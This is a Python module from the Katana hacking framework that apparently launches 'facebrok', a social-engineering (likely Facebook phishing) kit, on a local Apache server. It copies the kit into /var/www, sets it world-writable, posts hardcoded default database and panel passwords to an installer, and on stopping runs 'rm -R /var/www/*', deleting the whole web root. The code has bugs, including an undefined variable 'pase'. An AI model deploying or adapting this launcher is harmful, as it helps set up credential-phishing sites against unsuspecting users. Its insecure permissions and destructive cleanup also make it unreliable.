# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                     #
# Modules   : facebrok        #
# Script by : RedToor         #
# Date      : 23/08/2015      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                 #
from core.design import *     #
from core import help         #
from core import ping         #
d=DESIGN()                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                   #
import subprocess             #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                     #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
username_sql="root"
password_sql="toor"
database_sql="facebrok_db"
username_cp="admin"
password_cp="admin"
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #

def run(para,parb,parc,pard,pare):
	global username_sql,password_sql,database_sql,username_cp,password_cp
	username_sql=para
	password_sql=parb
	database_sql=parc
	username_cp=pard
	password_cp=pase
	facebrok(1)

def facebrok(run):
	try:
		global username_sql,password_sql,database_sql,username_cp,password_cp
		if run!=1:
			actions=raw_input(d.prompt("seng/facebrok"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("usql","yes","Username sql",username_sql)
			d.descrip("psql","yes","Password sql",password_sql)
			d.descrip("dsql","yes","Database sql",database_sql)
			d.descrip("upan","no","Username CPanel",username_cp)
			d.descrip("ppan","no","Password CPanel",password_cp)
 			print ""
		elif actions[0:8] == "set usql":
			username_sql = actions[9:]
			d.change("usql",username_sql)
			facebrok(0)
		elif actions[0:8] == "set psql":
			password_sql = actions[9:]
			d.change("psql",password_sql)
			facebrok(0)
		elif actions[0:8] == "set dsql":
			database_sql = actions[9:]
			d.change("dsql",database_sql)
			facebrok(0)
		elif actions[0:8] == "set upan":
			username_cp = actions[9:]
			d.change("upan",username_cp)
			facebrok(0)
		elif actions[0:8] == "set ppan":
			password_cp = actions[9:]
			d.change("ppan",password_cp)
			facebrok(0)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				print("\n "+Alr+" Installing facebrok project in local server")
				subprocess.call('cp -R files/facebrok/* /var/www/', shell=True)
				subprocess.call('chmod -R 777 /var/www/croak/', shell=True)
				if True:
					try:
						print(" "+Alr+" Starting Apache Server")
						subprocess.call('service apache2 start', shell=True)
						print(" "+Suf+" Apache Started")
						print(" "+Alr+" Starting Mysql Server")
						subprocess.call('service mysql start', shell=True)
						print(" "+Suf+" Mysql Started")
						subprocess.call('wget --post-data "server=127.0.0.1&user='+username_sql+'&pass='+password_sql+'&data='+database_sql+'&userp='+username_cp+'&passp='+password_cp+'" 127.0.0.1/croak/install/startgame.php', shell=True)
						print(" "+Suf+" Script Running in http://127.0.0.1/")
						print""
						print(" "+Suf+" Running facebrok Script...")
						raw_input(" "+Hlp+" Press any key for Stop facebrok")
						print(" "+Alr+" Stoping Process")
						subprocess.call('rm -R /var/www/*', shell=True)
						subprocess.call('apache2ctl stop', shell=True)
						print(" "+Alr+" Stoping Apache and facebrok project")
						print(" "+Suf+" Scritp Stoped and Apache")
					except:
						print(" "+Alr+" Stoping Process")
						subprocess.call('service apache2 stop', shell=True)
						subprocess.call('service mysql stop', shell=True)
						subprocess.call('rm -R /var/www/*', shell=True)
						print(" "+Suf+" Stoped")
						facebrok(0)
			except:
				d.kbi()
				exit()
		else:
			d.nocommand()
	except:
		d.kib()
		exit()
	facebrok(0)